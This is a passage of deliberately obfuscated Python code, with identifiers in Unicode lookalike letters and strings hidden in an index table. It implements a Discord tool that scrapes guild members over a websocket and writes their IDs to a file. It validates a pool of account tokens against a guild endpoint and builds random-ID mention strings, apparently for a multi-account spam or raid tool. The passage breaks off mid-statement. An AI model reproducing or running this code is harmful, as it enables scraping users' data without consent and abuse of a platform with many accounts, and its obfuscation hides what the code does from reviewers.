            𝘁𝗵𝗿𝘦𝙖𝘥𝙞𝗻𝗴.Thread(target=𝘀𝘦𝙡𝘧.heartbeatThread, args=(𝗱𝘦𝙘𝙤𝗱𝙚𝙙[𝘔𝗠𝗡𝙄𝘔𝙄𝙈𝘐𝘭𝗠𝘕𝗡𝗠𝘕𝗹𝙈𝙈𝘭𝗠𝙄𝗹𝗜𝘕𝗜𝙉𝙉𝙄𝗠𝗡𝘕𝘐𝙡[166]][𝙈𝙈𝗡𝘐𝘔𝘐𝗠𝙄𝙡𝙈𝘕𝘕𝘔𝗡𝙡𝙈𝙈𝘭𝘔𝙄𝘭𝗜𝙉𝙄𝘕𝘕𝙄𝘔𝗡𝙉𝙄𝗹[199]] / 1000,), daemon=True).start()
        if 𝘥𝙚𝘤𝘰𝘥𝙚𝙙[𝘔𝘔𝘕𝘐𝘔𝙄𝙈𝘐𝙡𝗠𝗡𝙉𝗠𝗡𝗹𝘔𝗠𝗹𝘔𝗜𝘭𝘐𝘕𝙄𝗡𝗡𝙄𝙈𝘕𝘕𝘐𝘭[200]] == 𝘔𝗠𝙉𝙄𝘔𝙄𝘔𝘐𝗹𝗠𝘕𝙉𝗠𝙉𝙡𝙈𝙈𝘭𝙈𝙄𝘭𝗜𝙉𝗜𝗡𝘕𝙄𝗠𝗡𝙉𝘐𝗹[201]:
            for 𝗴𝙪𝘪𝗹𝘥 in 𝘥𝘦𝙘𝘰𝙙𝘦𝙙[𝘔𝗠𝘕𝙄𝙈𝙄𝙈𝗜𝙡𝘔𝗡𝘕𝘔𝙉𝘭𝘔𝘔𝙡𝗠𝗜𝙡𝗜𝘕𝘐𝘕𝗡𝗜𝘔𝗡𝙉𝗜𝗹[166]][𝙈𝙈𝗡𝙄𝙈𝘐𝘔𝙄𝗹𝗠𝙉𝘕𝘔𝘕𝗹𝘔𝙈𝗹𝙈𝙄𝘭𝙄𝗡𝘐𝙉𝗡𝙄𝗠𝘕𝗡𝘐𝘭[202]]:
                𝘀𝗲𝘭𝘧.guilds[𝗴𝙪𝙞𝙡𝗱[𝘔𝘔𝗡𝘐𝗠𝘐𝙈𝘐𝘭𝙈𝙉𝘕𝙈𝗡𝘭𝗠𝗠𝙡𝗠𝘐𝙡𝘐𝗡𝗜𝘕𝗡𝗜𝗠𝙉𝗡𝘐𝙡[160]]] = {𝗠𝗠𝙉𝙄𝙈𝘐𝘔𝗜𝘭𝘔𝘕𝗡𝗠𝙉𝙡𝘔𝗠𝙡𝗠𝘐𝙡𝘐𝘕𝘐𝙉𝘕𝘐𝘔𝗡𝗡𝘐𝗹[159]: 𝘨𝘶𝗶𝘭𝘥[𝙈𝗠𝗡𝙄𝘔𝘐𝗠𝙄𝙡𝙈𝘕𝗡𝗠𝙉𝙡𝗠𝙈𝘭𝙈𝗜𝙡𝗜𝙉𝗜𝗡𝗡𝘐𝙈𝘕𝗡𝘐𝘭[159]]}
        if 𝙙𝘦𝘤𝗼𝗱𝗲𝘥[𝗠𝘔𝗡𝘐𝗠𝙄𝘔𝙄𝙡𝙈𝙉𝘕𝗠𝙉𝘭𝗠𝗠𝗹𝘔𝘐𝘭𝙄𝙉𝘐𝙉𝘕𝘐𝘔𝘕𝘕𝙄𝙡[200]] == 𝗠𝗠𝙉𝙄𝘔𝘐𝙈𝗜𝗹𝙈𝘕𝙉𝙈𝙉𝙡𝗠𝙈𝘭𝙈𝙄𝗹𝙄𝘕𝗜𝘕𝘕𝘐𝙈𝗡𝘕𝗜𝘭[203]:
            𝘀𝙚𝘁𝗮𝙩𝙩𝘳(𝙨𝘦𝘭𝘧, 'ranges', 𝙐𝘵𝙞𝘭𝙨.getRanges(0, 100, 𝘴𝗲𝘭𝗳.guilds[𝙨𝙚𝙡𝘧.guild_id][𝘔𝘔𝗡𝗜𝙈𝘐𝘔𝗜𝗹𝘔𝙉𝘕𝘔𝙉𝘭𝙈𝗠𝗹𝘔𝘐𝗹𝙄𝗡𝗜𝗡𝙉𝘐𝘔𝘕𝗡𝘐𝗹[159]]))
            𝘀𝗲𝗹𝙛.scrapeUsers()
        elif 𝙙𝙚𝘤𝘰𝗱𝙚𝗱[𝙈𝙈𝗡𝙄𝗠𝘐𝘔𝗜𝗹𝘔𝗡𝙉𝗠𝘕𝗹𝗠𝙈𝘭𝗠𝘐𝗹𝙄𝗡𝘐𝘕𝘕𝙄𝘔𝘕𝙉𝗜𝘭[200]] == 𝗠𝙈𝘕𝙄𝙈𝙄𝙈𝗜𝙡𝘔𝗡𝗡𝘔𝙉𝘭𝙈𝗠𝘭𝘔𝗜𝗹𝘐𝘕𝘐𝗡𝘕𝗜𝗠𝘕𝘕𝘐𝙡[204]:
            𝙥𝙖𝗿𝘴𝙚𝙙 = 𝗨𝘵𝗶𝗹𝙨.parseGuildMemberListUpdate(𝙙𝗲𝘤𝘰𝗱𝙚𝗱)
            if 𝘱𝘢𝙧𝙨𝙚𝘥[𝗠𝗠𝙉𝙄𝘔𝙄𝙈𝙄𝗹𝗠𝘕𝙉𝘔𝙉𝗹𝘔𝙈𝘭𝙈𝗜𝙡𝗜𝘕𝘐𝗡𝘕𝘐𝗠𝘕𝗡𝙄𝗹[161]] == 𝘴𝗲𝗹𝘧.guild_id and (𝘔𝙈𝙉𝘐𝙈𝘐𝗠𝘐𝙡𝘔𝘕𝗡𝗠𝙉𝗹𝘔𝗠𝗹𝗠𝘐𝙡𝘐𝘕𝙄𝙉𝙉𝙄𝙈𝗡𝗡𝘐𝗹[170] in 𝘱𝙖𝘳𝙨𝗲𝗱[𝘔𝙈𝗡𝘐𝘔𝗜𝗠𝘐𝙡𝙈𝙉𝗡𝘔𝗡𝙡𝙈𝗠𝗹𝙈𝗜𝙡𝙄𝗡𝙄𝗡𝘕𝗜𝗠𝙉𝗡𝙄𝙡[163]] or 𝗠𝗠𝘕𝗜𝘔𝙄𝗠𝗜𝘭𝗠𝙉𝗡𝗠𝗡𝙡𝗠𝙈𝙡𝘔𝗜𝘭𝗜𝘕𝗜𝘕𝘕𝘐𝘔𝘕𝙉𝘐𝙡[175] in 𝗽𝘢𝘳𝘴𝙚𝙙[𝗠𝗠𝗡𝗜𝘔𝗜𝘔𝘐𝗹𝙈𝘕𝙉𝙈𝘕𝗹𝘔𝘔𝙡𝙈𝗜𝗹𝙄𝙉𝘐𝙉𝘕𝗜𝘔𝘕𝗡𝙄𝘭[163]]):
                for 𝗲𝘭𝘦𝘮, 𝘪𝙣𝘥𝘦𝘅 in 𝙚𝙣𝘶𝘮𝗲𝘳𝙖𝘵𝙚(𝗽𝙖𝗿𝙨𝗲𝙙[𝙈𝗠𝗡𝘐𝘔𝙄𝙈𝙄𝗹𝘔𝙉𝘕𝙈𝙉𝙡𝗠𝗠𝗹𝘔𝘐𝘭𝙄𝘕𝗜𝘕𝗡𝗜𝙈𝗡𝘕𝗜𝗹[163]]):
                    if 𝙞𝘯𝙙𝗲𝘹 == 𝙈𝙈𝙉𝘐𝙈𝗜𝗠𝗜𝙡𝗠𝙉𝗡𝗠𝗡𝘭𝗠𝙈𝙡𝙈𝙄𝘭𝘐𝙉𝘐𝙉𝗡𝗜𝙈𝘕𝗡𝘐𝗹[170]:
                        if 𝙡𝙚𝙣(𝘱𝗮𝙧𝘴𝙚𝗱[𝗠𝘔𝘕𝙄𝙈𝗜𝗠𝘐𝗹𝗠𝘕𝙉𝘔𝗡𝗹𝙈𝙈𝙡𝘔𝗜𝙡𝙄𝗡𝗜𝘕𝙉𝘐𝘔𝙉𝗡𝙄𝗹[165]][𝘦𝘭𝘦𝙢]) == 0:
                            𝙨𝙚𝙩𝙖𝘁𝘵𝘳(𝘀𝘦𝘭𝙛, 'endScraping', True)
                            break
                        for 𝗶𝘁𝘦𝘮 in 𝗽𝙖𝙧𝘀𝗲𝙙[𝘔𝘔𝗡𝙄𝘔𝙄𝘔𝙄𝗹𝘔𝗡𝙉𝘔𝙉𝙡𝙈𝗠𝙡𝙈𝘐𝙡𝗜𝗡𝙄𝗡𝘕𝗜𝗠𝗡𝘕𝙄𝗹[165]][𝙚𝗹𝗲𝘮]:
                            if 𝙈𝘔𝙉𝗜𝗠𝙄𝗠𝘐𝙡𝙈𝗡𝗡𝗠𝗡𝘭𝘔𝗠𝗹𝘔𝘐𝘭𝙄𝗡𝙄𝙉𝙉𝗜𝙈𝗡𝙉𝗜𝙡[205] in 𝘪𝘁𝘦𝗺:
                                𝗺𝗲𝙢 = 𝙞𝘵𝗲𝗺[𝘔𝗠𝘕𝘐𝙈𝙄𝙈𝙄𝗹𝙈𝘕𝙉𝘔𝘕𝙡𝘔𝙈𝗹𝙈𝘐𝘭𝘐𝙉𝗜𝙉𝘕𝗜𝗠𝘕𝘕𝗜𝙡[205]]
                                𝗼𝙗𝗷 = {𝘔𝘔𝙉𝙄𝘔𝙄𝗠𝘐𝘭𝘔𝗡𝘕𝙈𝙉𝗹𝘔𝙈𝘭𝘔𝙄𝗹𝘐𝗡𝘐𝙉𝘕𝗜𝗠𝙉𝙉𝘐𝗹[206]: 𝗺𝘦𝗺[𝙈𝙈𝗡𝗜𝘔𝗜𝙈𝗜𝘭𝙈𝙉𝗡𝙈𝘕𝗹𝗠𝘔𝙡𝘔𝙄𝗹𝙄𝘕𝗜𝙉𝙉𝗜𝗠𝗡𝗡𝘐𝙡[207]][𝙈𝗠𝘕𝙄𝗠𝙄𝙈𝗜𝙡𝘔𝗡𝘕𝘔𝘕𝘭𝗠𝙈𝙡𝙈𝙄𝙡𝗜𝘕𝗜𝙉𝘕𝙄𝗠𝙉𝙉𝗜𝗹[208]] + 𝘔𝘔𝙉𝙄𝘔𝘐𝙈𝗜𝗹𝘔𝙉𝗡𝙈𝘕𝘭𝗠𝘔𝗹𝙈𝙄𝘭𝙄𝘕𝘐𝘕𝘕𝗜𝗠𝙉𝗡𝙄𝘭[209] + 𝙢𝙚𝘮[𝙈𝗠𝙉𝘐𝗠𝘐𝗠𝗜𝘭𝙈𝗡𝘕𝗠𝗡𝗹𝗠𝙈𝗹𝘔𝗜𝗹𝗜𝗡𝙄𝙉𝗡𝙄𝗠𝙉𝙉𝗜𝙡[207]][𝘔𝙈𝙉𝗜𝘔𝘐𝗠𝗜𝘭𝗠𝘕𝘕𝘔𝙉𝙡𝙈𝘔𝗹𝙈𝘐𝘭𝘐𝗡𝗜𝙉𝙉𝙄𝙈𝗡𝗡𝙄𝗹[210]], 𝘔𝙈𝘕𝘐𝗠𝗜𝘔𝘐𝗹𝘔𝙉𝗡𝙈𝙉𝙡𝙈𝘔𝙡𝗠𝗜𝗹𝗜𝘕𝗜𝘕𝘕𝙄𝗠𝘕𝘕𝘐𝗹[160]: 𝘮𝘦𝙢[𝗠𝗠𝗡𝗜𝙈𝙄𝘔𝙄𝗹𝗠𝙉𝘕𝘔𝘕𝗹𝙈𝗠𝗹𝙈𝗜𝘭𝙄𝙉𝘐𝘕𝗡𝘐𝗠𝘕𝘕𝘐𝘭[207]][𝙈𝗠𝙉𝙄𝙈𝘐𝙈𝗜𝘭𝗠𝘕𝗡𝗠𝗡𝘭𝘔𝙈𝙡𝗠𝙄𝘭𝙄𝙉𝗜𝘕𝘕𝘐𝘔𝙉𝙉𝗜𝘭[160]]}
                                if not 𝘮𝘦𝙢[𝘔𝙈𝘕𝘐𝙈𝘐𝘔𝙄𝘭𝘔𝘕𝙉𝘔𝙉𝘭𝗠𝗠𝗹𝗠𝗜𝘭𝘐𝗡𝗜𝘕𝙉𝗜𝘔𝗡𝗡𝗜𝙡[207]].get(𝙈𝘔𝘕𝙄𝗠𝗜𝗠𝘐𝙡𝙈𝗡𝙉𝘔𝗡𝙡𝙈𝘔𝗹𝗠𝘐𝘭𝗜𝘕𝘐𝘕𝙉𝙄𝙈𝘕𝙉𝙄𝗹[211]):
                                    𝘴𝘦𝘭𝗳.members[𝙢𝘦𝙢[𝘔𝙈𝗡𝘐𝘔𝗜𝙈𝙄𝘭𝗠𝗡𝗡𝗠𝙉𝙡𝘔𝙈𝙡𝘔𝗜𝙡𝘐𝘕𝗜𝗡𝗡𝘐𝗠𝘕𝗡𝘐𝙡[207]][𝗠𝗠𝘕𝘐𝙈𝗜𝘔𝘐𝘭𝗠𝗡𝗡𝗠𝘕𝗹𝙈𝙈𝘭𝙈𝘐𝘭𝙄𝘕𝘐𝗡𝗡𝘐𝘔𝙉𝗡𝘐𝘭[160]]] = 𝙤𝘣𝙟
                    elif 𝘪𝙣𝘥𝘦𝘹 == 𝗠𝙈𝘕𝗜𝘔𝘐𝙈𝗜𝙡𝗠𝗡𝘕𝗠𝙉𝘭𝗠𝘔𝘭𝘔𝗜𝙡𝗜𝙉𝗜𝙉𝙉𝗜𝘔𝙉𝙉𝙄𝙡[175]:
                        for 𝗶𝘁𝗲𝙢 in 𝘱𝙖𝗿𝘀𝘦𝘥[𝗠𝘔𝙉𝗜𝘔𝗜𝙈𝘐𝘭𝙈𝗡𝗡𝗠𝙉𝘭𝗠𝙈𝗹𝘔𝘐𝗹𝙄𝙉𝙄𝗡𝙉𝘐𝘔𝙉𝙉𝙄𝙡[165]][𝙚𝘭𝘦𝘮]:
                            if 𝗠𝘔𝘕𝘐𝗠𝘐𝘔𝗜𝙡𝗠𝗡𝙉𝗠𝘕𝘭𝙈𝗠𝙡𝘔𝙄𝘭𝙄𝙉𝘐𝙉𝙉𝙄𝘔𝙉𝙉𝗜𝗹[205] in 𝗶𝘁𝙚𝘮:
                                𝙢𝗲𝘮 = 𝘪𝘵𝘦𝙢[𝘔𝘔𝙉𝙄𝗠𝗜𝘔𝘐𝙡𝙈𝗡𝘕𝗠𝗡𝘭𝘔𝙈𝘭𝘔𝘐𝘭𝘐𝘕𝙄𝙉𝙉𝙄𝗠𝙉𝘕𝘐𝘭[205]]
                                𝗼𝘣𝘫 = {𝘔𝘔𝘕𝙄𝗠𝙄𝘔𝙄𝗹𝙈𝙉𝘕𝗠𝘕𝗹𝗠𝘔𝙡𝘔𝘐𝗹𝙄𝘕𝗜𝘕𝘕𝗜𝙈𝙉𝙉𝗜𝗹[206]: 𝙢𝗲𝘮[𝙈𝘔𝗡𝘐𝗠𝘐𝗠𝙄𝗹𝗠𝙉𝘕𝙈𝗡𝘭𝘔𝙈𝙡𝙈𝘐𝗹𝗜𝙉𝘐𝘕𝘕𝘐𝙈𝘕𝙉𝘐𝗹[207]][𝙈𝙈𝙉𝘐𝘔𝗜𝙈𝙄𝗹𝗠𝘕𝗡𝗠𝘕𝗹𝙈𝘔𝙡𝗠𝗜𝘭𝙄𝘕𝘐𝙉𝘕𝙄𝘔𝗡𝘕𝗜𝙡[208]] + 𝘔𝙈𝘕𝘐𝗠𝙄𝗠𝘐𝘭𝙈𝘕𝘕𝘔𝗡𝘭𝗠𝗠𝘭𝘔𝙄𝗹𝘐𝙉𝙄𝘕𝗡𝘐𝙈𝗡𝙉𝙄𝘭[209] + 𝗺𝗲𝗺[𝙈𝙈𝗡𝗜𝗠𝙄𝗠𝘐𝘭𝙈𝗡𝗡𝘔𝘕𝘭𝘔𝗠𝙡𝗠𝘐𝘭𝘐𝗡𝗜𝘕𝗡𝘐𝗠𝗡𝘕𝘐𝗹[207]][𝗠𝗠𝗡𝙄𝘔𝘐𝙈𝘐𝙡𝙈𝙉𝗡𝘔𝙉𝙡𝗠𝙈𝘭𝘔𝘐𝘭𝗜𝘕𝗜𝗡𝙉𝘐𝙈𝙉𝗡𝙄𝘭[210]], 𝘔𝗠𝙉𝘐𝘔𝗜𝘔𝘐𝘭𝗠𝘕𝗡𝗠𝗡𝙡𝙈𝗠𝙡𝙈𝘐𝗹𝗜𝙉𝙄𝘕𝗡𝘐𝘔𝗡𝗡𝙄𝗹[160]: 𝘮𝘦𝙢[𝙈𝙈𝘕𝘐𝙈𝗜𝘔𝙄𝗹𝗠𝙉𝘕𝗠𝗡𝘭𝗠𝗠𝗹𝗠𝘐𝙡𝗜𝗡𝘐𝗡𝙉𝗜𝘔𝙉𝘕𝘐𝙡[207]][𝘔𝘔𝗡𝘐𝗠𝙄𝘔𝘐𝘭𝘔𝙉𝘕𝘔𝗡𝙡𝙈𝙈𝙡𝗠𝙄𝙡𝘐𝗡𝗜𝘕𝙉𝙄𝙈𝙉𝘕𝙄𝙡[160]]}
                                if not 𝘮𝙚𝙢[𝘔𝙈𝗡𝘐𝙈𝙄𝘔𝙄𝗹𝘔𝗡𝗡𝙈𝘕𝘭𝗠𝗠𝙡𝗠𝙄𝙡𝘐𝘕𝗜𝗡𝙉𝘐𝗠𝗡𝗡𝙄𝘭[207]].get(𝙈𝙈𝘕𝗜𝙈𝘐𝘔𝘐𝗹𝙈𝘕𝗡𝘔𝙉𝙡𝘔𝗠𝘭𝗠𝗜𝙡𝙄𝙉𝘐𝘕𝙉𝗜𝙈𝘕𝗡𝙄𝗹[211]):
                                    𝘀𝙚𝘭𝘧.members[𝘮𝘦𝗺[𝙈𝘔𝙉𝙄𝘔𝙄𝗠𝘐𝙡𝙈𝙉𝘕𝙈𝗡𝗹𝗠𝙈𝘭𝗠𝗜𝘭𝗜𝗡𝘐𝘕𝗡𝙄𝗠𝙉𝗡𝙄𝗹[207]][𝗠𝙈𝗡𝘐𝙈𝙄𝗠𝗜𝘭𝘔𝙉𝗡𝘔𝗡𝗹𝙈𝙈𝘭𝘔𝘐𝙡𝘐𝙉𝙄𝗡𝗡𝘐𝗠𝘕𝗡𝘐𝗹[160]]] = 𝗼𝙗𝘫
                    𝙨𝗲𝘭𝘧.lastRange += 1
                    𝙨𝙚𝘁𝘢𝘵𝘁𝘳(𝘴𝗲𝗹𝙛, 'ranges', 𝘜𝙩𝙞𝗹𝙨.getRanges(𝘴𝙚𝘭𝗳.lastRange, 100, 𝘴𝘦𝘭𝙛.guilds[𝘴𝙚𝗹𝙛.guild_id][𝗠𝗠𝗡𝘐𝙈𝘐𝙈𝙄𝗹𝗠𝗡𝘕𝙈𝗡𝙡𝘔𝘔𝗹𝘔𝗜𝙡𝙄𝗡𝗜𝗡𝘕𝙄𝘔𝘕𝘕𝘐𝘭[159]]))
                    𝘵𝙞𝗺𝙚.sleep(0.45)
                    𝙨𝘦𝗹𝘧.scrapeUsers()
            if 𝙨𝙚𝙡𝘧.endScraping:
                𝘀𝗲𝗹𝙛.close()

    def sock_close(self, ws, close_code, close_msg):
        pass

def scrape(token, guild_id, channel_id):
    𝘀𝗯 = 𝗗𝙞𝙨𝗰𝘰𝗿𝗱𝘚𝙤𝗰𝗸𝘦𝘵(𝘁𝙤𝗸𝘦𝘯, 𝘨𝘶𝗶𝙡𝙙_𝙞𝗱, 𝗰𝗵𝙖𝙣𝗻𝗲𝗹_𝘪𝘥)
    return 𝘴𝗯.run()

def scraper(guildid, channelid):
    with 𝘰𝘱𝗲𝘯(𝗠𝙈𝗡𝙄𝙈𝙄𝗠𝙄𝙡𝙈𝙉𝘕𝙈𝙉𝙡𝘔𝙈𝗹𝙈𝗜𝘭𝗜𝙉𝙄𝘕𝘕𝗜𝙈𝙉𝘕𝘐𝘭[212], 𝗠𝘔𝘕𝗜𝘔𝙄𝘔𝗜𝗹𝗠𝙉𝗡𝘔𝙉𝗹𝘔𝙈𝗹𝗠𝙄𝗹𝙄𝘕𝘐𝙉𝘕𝗜𝙈𝙉𝘕𝙄𝗹[213]) as 𝙛:
        𝙛.truncate(0)
    𝙩𝘰𝙠𝘦𝗻 = 𝗠𝙈𝗡𝙄𝗠𝘐𝗠𝗜𝘭𝘔𝗡𝙉𝘔𝙉𝙡𝙈𝗠𝘭𝗠𝘐𝙡𝗜𝘕𝗜𝗡𝘕𝗜𝙈𝗡𝙉𝙄𝘭[22]
    𝙩𝘰𝘬𝗲𝗻𝘀𝙞𝙣𝙜𝙪𝗶𝘭𝗱 = []
    𝙩𝙤𝙠𝘦𝘯 = 𝗿𝘢𝘯𝙙𝙤𝗺.choice(𝘁𝗼𝗸𝙚𝘯𝙨)
    𝙪𝘳𝗹 = f'{𝙈𝗠𝘕𝙄𝙈𝘐𝘔𝘐𝗹𝗠𝘕𝘕𝘔𝙉𝘭𝘔𝘔𝙡𝙈𝘐𝗹𝗜𝘕𝙄𝙉𝘕𝙄𝗠𝘕𝗡𝗜𝗹[152]}{𝗴𝘶𝙞𝘭𝗱𝗶𝗱}'

    def checktokens(token):
        𝙧 = 𝗿𝗲𝙦𝘂𝘦𝘀𝘵𝘀.get(𝘂𝗿𝘭, headers={𝙈𝗠𝘕𝘐𝙈𝗜𝗠𝗜𝙡𝗠𝗡𝗡𝘔𝘕𝗹𝙈𝘔𝘭𝙈𝙄𝙡𝙄𝘕𝗜𝘕𝘕𝘐𝘔𝗡𝗡𝙄𝘭[130]: 𝘁𝙤𝘬𝗲𝗻})
        if 𝗿.status_code == 200:
            𝘵𝙤𝙠𝙚𝘯𝘴𝙞𝗻𝘨𝘶𝙞𝘭𝙙.append(𝘁𝙤𝘬𝙚𝙣)
    𝘁𝗵𝗿𝗲𝘢𝗱𝙨 = []
    for 𝘁𝘰𝗸𝙚𝘯 in 𝘵𝘰𝘬𝙚𝗻𝙨:
        𝘁 = 𝘵𝘩𝘳𝗲𝘢𝗱𝗶𝗻𝘨.Thread(target=𝙘𝗵𝘦𝘤𝘬𝘁𝙤𝘬𝘦𝙣𝘀, args=(f'{𝙩𝙤𝘬𝘦𝘯}',))
        𝙩.start()
        𝘵𝙝𝗿𝙚𝗮𝘥𝘀.append(𝙩)
    for 𝙩 in 𝘁𝘩𝗿𝙚𝗮𝗱𝙨:
        𝙩.join()
    try:
        𝙩𝘰𝙠𝙚𝗻 = 𝗿𝘢𝗻𝙙𝙤𝗺.choice(𝙩𝙤𝗸𝘦𝙣𝙨𝘪𝙣𝙜𝘶𝗶𝗹𝘥)
    except:
        𝙥𝘳𝙞𝙣𝘁(𝗠𝙈𝗡𝘐𝘔𝙄𝙈𝗜𝗹𝘔𝙉𝗡𝗠𝙉𝗹𝙈𝗠𝙡𝙈𝙄𝗹𝙄𝗡𝙄𝙉𝘕𝘐𝗠𝙉𝗡𝗜𝙡[214])
        𝗲𝙭𝙞𝘁(0)
    𝗺𝗲𝙢𝗯𝗲𝙧𝘴 = 𝙨𝗰𝗿𝘢𝗽𝙚(𝘵𝗼𝙠𝙚𝘯, f'{𝘨𝘶𝘪𝘭𝗱𝙞𝗱}', f'{𝙘𝗵𝗮𝘯𝗻𝗲𝘭𝗶𝘥}')
    for 𝘮𝘦𝘮𝘣𝗲𝙧 in 𝗺𝘦𝗺𝘣𝙚𝗿𝙨:
        𝘰𝗽𝘦𝙣(𝙈𝘔𝙉𝙄𝘔𝗜𝙈𝗜𝘭𝘔𝙉𝙉𝙈𝙉𝘭𝗠𝘔𝗹𝗠𝙄𝗹𝙄𝙉𝙄𝙉𝙉𝗜𝗠𝗡𝘕𝙄𝗹[212], 𝘔𝗠𝙉𝘐𝘔𝗜𝘔𝗜𝗹𝗠𝙉𝙉𝙈𝘕𝗹𝙈𝗠𝙡𝗠𝗜𝙡𝙄𝙉𝘐𝘕𝘕𝗜𝘔𝙉𝙉𝘐𝘭[215]).write(𝙞𝗨𝘔𝘀𝙑𝙝𝙉𝙂𝙋𝘿𝗪𝘣6𝙬𝘧𝘆𝘍𝘽𝗘𝗣𝙙7𝗛𝙘𝙝𝗹𝙗𝘸𝘔𝙀𝗶𝗳.mro()[10](𝗺𝘦𝘮𝘣𝙚𝙧) + 𝙈𝙈𝘕𝘐𝗠𝙄𝙈𝗜𝙡𝙈𝘕𝗡𝗠𝗡𝙡𝗠𝙈𝘭𝙈𝙄𝘭𝗜𝙉𝙄𝘕𝙉𝘐𝘔𝙉𝙉𝙄𝙡[63])

def getrandomids(ids):
    with 𝙤𝙥𝗲𝙣(f'{𝘔𝗠𝘕𝙄𝗠𝘐𝙈𝗜𝗹𝘔𝘕𝘕𝙈𝗡𝙡𝘔𝗠𝙡𝙈𝘐𝘭𝘐𝗡𝗜𝘕𝘕𝘐𝗠𝙉𝗡𝙄𝘭[212]}', 𝙈𝗠𝘕𝙄𝙈𝘐𝙈𝗜𝙡𝗠𝘕𝘕𝘔𝗡𝙡𝙈𝗠𝙡𝙈𝘐𝗹𝗜𝗡𝘐𝘕𝗡𝘐𝘔𝗡𝘕𝗜𝘭[30], encoding=𝘔𝙈𝗡𝗜𝘔𝙄𝘔𝘐𝙡𝘔𝙉𝙉𝗠𝙉𝘭𝘔𝘔𝙡𝙈𝘐𝘭𝗜𝘕𝘐𝘕𝗡𝗜𝗠𝙉𝘕𝗜𝘭[27]) as 𝙛:
        𝗱𝗶𝘀𝙘𝙤𝙧𝙙_𝘶𝘴𝘦𝘳𝙨 = [𝗹𝙞𝙣𝘦.strip() for 𝗹𝗶𝗻𝙚 in 𝘧.readlines()]
    𝙧𝗮𝗻𝙙𝙤𝘮_𝙞𝗱𝘀 = 𝗿𝗮𝙣𝙙𝘰𝙢.sample(𝙙𝙞𝙨𝗰𝘰𝗿𝙙_𝘂𝘴𝙚𝗿𝙨, 𝙞𝗱𝘴)
    return 𝗠𝙈𝗡𝗜𝗠𝙄𝗠𝘐𝙡𝙈𝙉𝘕𝙈𝙉𝘭𝙈𝗠𝗹𝘔𝘐𝗹𝙄𝘕𝙄𝗡𝙉𝘐𝙈𝗡𝗡𝗜𝙡[216] + 𝙈𝘔𝙉𝙄𝙈𝙄𝗠𝙄𝘭𝘔𝙉𝘕𝘔𝘕𝙡𝙈𝘔𝗹𝙈𝙄𝙡𝘐𝗡𝙄𝗡𝘕𝙄𝗠𝘕𝗡𝗜𝗹[217].join(𝗿𝘢𝗻𝘥𝙤𝗺_𝗶𝙙𝘀) + 𝙈𝘔𝘕𝙄𝗠𝙄𝗠𝗜𝘭𝗠𝗡𝘕𝗠𝙉𝙡𝘔𝘔𝘭𝘔𝗜𝗹𝘐𝙉𝗜𝗡𝙉𝗜𝙈𝙉𝘕𝗜𝙡[218]

def Headers(token):
    return {𝙈𝗠𝗡𝘐𝗠𝘐𝙈𝘐𝗹𝗠𝙉𝙉𝘔𝘕𝘭𝗠𝙈𝘭𝘔𝘐𝗹𝗜𝙉𝘐𝘕𝗡𝙄𝙈𝘕𝗡𝗜𝙡[219]: 𝘁𝗼𝗸𝗲𝙣, 𝘔𝘔𝘕𝙄𝙈𝘐𝗠𝗜𝘭𝗠𝗡𝘕𝘔𝗡𝙡𝗠𝗠𝙡𝘔𝙄𝙡𝙄𝙉𝘐𝗡𝗡𝗜𝘔𝙉𝗡𝗜𝘭[127]: 𝘔𝗠𝘕𝗜𝘔𝘐𝗠𝘐𝙡𝙈𝘕𝙉𝘔𝙉𝘭𝘔𝘔𝘭𝗠𝗜𝗹𝘐𝗡𝗜𝘕𝙉𝙄𝙈𝘕𝘕𝘐𝙡[136], 𝘔𝗠𝙉𝗜𝘔𝘐𝗠𝙄𝘭𝘔𝙉𝗡𝘔𝘕𝙡𝙈𝗠𝙡𝗠𝙄𝙡𝘐𝘕𝘐𝙉𝘕𝘐𝘔𝗡𝙉𝙄𝘭[128]: 𝗠𝙈𝘕𝘐𝗠𝗜𝗠𝙄𝗹𝗠𝘕𝗡𝙈𝘕𝗹𝘔𝗠𝗹𝘔𝘐𝘭𝘐𝙉𝗜𝗡𝙉𝘐𝙈𝘕𝘕𝙄𝙡[137], 𝘔𝙈𝙉𝗜𝙈𝘐𝙈𝙄𝘭𝙈𝘕𝙉𝗠𝗡𝘭𝘔𝘔𝙡𝙈𝙄𝙡𝗜𝘕𝙄𝗡𝘕𝙄𝗠𝗡𝙉𝙄𝘭[129]: 𝘔𝗠𝙉𝗜𝙈𝘐𝗠𝘐𝗹𝘔𝘕𝗡𝗠𝗡𝘭𝙈𝗠𝘭𝙈𝗜𝙡𝗜𝘕𝙄𝘕𝙉𝘐𝗠𝗡𝙉𝗜𝘭[230], 𝘔𝙈𝗡𝗜𝘔𝘐𝙈𝗜𝙡𝘔𝙉𝗡𝙈𝙉𝗹𝙈𝙈𝗹𝗠𝙄𝗹𝗜𝘕𝗜𝘕𝘕𝙄𝙈𝗡𝗡𝗜𝗹[220]: 𝗠𝘔𝘕𝗜𝙈𝗜𝗠𝙄𝘭𝘔𝙉𝙉𝗠𝙉𝘭𝙈𝙈𝗹𝘔𝘐𝘭𝙄𝗡𝘐𝙉𝙉𝘐𝘔𝗡𝗡𝗜𝗹[231], 𝗠𝘔𝗡𝗜𝗠𝘐𝘔𝙄𝙡𝘔𝙉𝙉𝗠𝘕𝙡𝘔𝘔𝘭𝘔𝘐𝗹𝘐𝗡𝗜𝙉𝙉𝙄𝙈𝗡𝙉𝗜𝙡[131]: 𝙈𝗠𝘕𝘐𝙈𝘐𝘔𝙄𝙡𝘔𝙉𝘕𝙈𝗡𝙡𝙈𝘔𝗹𝘔𝙄𝘭𝘐𝗡𝗜𝘕𝗡𝗜𝙈𝙉𝙉𝗜𝗹[232], 𝙈𝙈𝘕𝘐𝗠𝘐𝗠𝙄𝙡𝗠𝘕𝗡𝘔𝙉𝙡𝘔𝙈𝗹𝗠𝘐𝗹𝘐𝘕𝘐𝘕𝗡𝘐𝙈𝙉𝙉𝙄𝙡[221]: 𝗠𝙈𝘕𝘐𝙈𝘐𝙈𝙄𝗹𝘔𝗡𝘕𝙈𝗡𝙡𝘔𝘔𝙡𝙈𝙄𝙡𝗜𝙉𝙄𝙉𝙉𝙄𝘔𝙉𝘕𝗜𝘭[100], 𝙈𝗠𝙉𝙄𝙈𝗜𝘔𝗜𝙡𝙈𝗡𝗡𝘔𝙉𝗹𝗠𝙈𝗹𝙈𝗜𝙡𝗜𝘕𝙄𝙉𝘕𝗜𝙈𝘕𝙉𝗜𝙡[222]: 